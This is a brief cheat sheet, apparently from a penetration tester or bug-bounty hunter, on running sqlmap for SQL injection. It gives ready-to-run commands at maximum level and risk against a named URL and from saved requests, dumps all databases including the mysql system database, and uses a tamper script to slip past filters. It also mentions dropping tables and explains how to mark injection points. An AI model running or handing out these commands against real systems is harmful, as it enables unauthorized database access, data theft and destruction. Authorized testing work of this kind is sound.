Step 1: After detection using various methods Use the sqlmap tool 

### URL ### 
sqlmap -u "https://usl.com/index.php?r=" -p "r" --force-ssl --level 5 --risk 3 --dbs --random-agent --batch --time-sec 10

### Through Request###
sqlmap -r sqlmap --level 5 --risk 3 -D mysql --dump-all --batch --random-agent --force-ssl --thread 5
sqlmap -r sql --batch --dbs --random-agent --force-ssl --level 5 --risk 3 --tamper=space2comment

Note: Do place * on the parameter in the request body where you want SQL to inject its payloads

### Post sqlmap ###

After finding the SQL injection or dropping the tables or rows, etc., During the reporting time, use the flag below to narrow down the requests.

--test-filter=""
